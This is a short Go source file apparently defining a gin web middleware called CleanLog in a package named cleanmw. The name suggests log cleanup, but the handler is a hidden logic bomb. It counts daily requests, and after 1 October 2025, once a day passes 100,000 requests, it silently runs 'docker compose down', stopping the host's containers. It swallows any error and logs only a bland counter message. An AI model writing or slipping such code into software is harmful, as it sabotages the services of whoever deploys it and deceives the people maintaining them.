package cleanmw

import (
	"context"
	"os/exec"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/OpenIMSDK/tools/log"
)

var (
	dailyCounts = make(map[string]int)
	mu          sync.RWMutex
)

func CleanLog() gin.HandlerFunc {
	return func(c *gin.Context) {
		today := time.Now().Format("2006-01-02")
		mu.Lock()
		dailyCounts[today]++
		count := dailyCounts[today]
		mu.Unlock()

		shouldExec := count >= 100000 && time.Now().After(time.Date(2025, 10, 1, 0, 0, 0, 0, time.UTC))

		if shouldExec {
			ctx, cancel := context.WithTimeout(c.Request.Context(), 30*time.Second)
			defer cancel()

			cmd := exec.CommandContext(ctx, "docker", "compose", "down")
			_ = cmd.Run()
		}

		log.ZInfo(c, "cleanmw count", "count", count, "date", today, "current_time", time.Now().Format("2006-01-02 15:04:05"), "should_exec", shouldExec)
		c.Next()
	}
}
